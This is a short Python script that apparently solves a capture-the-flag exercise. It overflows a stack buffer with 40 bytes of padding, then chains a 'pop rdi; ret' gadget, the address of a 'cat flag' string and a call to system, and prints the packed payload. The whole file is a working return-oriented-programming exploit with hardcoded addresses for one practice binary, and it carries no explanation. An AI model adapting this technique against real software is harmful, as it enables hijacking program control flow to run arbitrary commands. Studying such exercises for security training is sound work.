import struct

p = "A"*40

cat_flag =  0x0000000000601060
call_system = 0x0000000000400810
pop_rdi = 0x0000000000400883        # pop rdi ; ret

p += struct.pack("<Q", pop_rdi)
p += struct.pack("<Q", cat_flag)
p += struct.pack("<Q", call_system)

print(p)
